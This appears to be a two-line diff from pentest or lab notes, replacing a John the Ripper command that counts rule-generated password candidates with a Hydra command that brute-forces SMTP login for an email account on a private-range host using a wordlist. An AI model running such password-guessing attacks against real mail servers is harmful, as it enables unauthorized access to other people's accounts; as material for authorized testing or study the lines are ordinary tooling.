@@ -1,2 +1,2 @@
 
-john --wordlist=/tmp/single-password-list.txt --rules=best64 --stdout | wc -l
+hydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v 
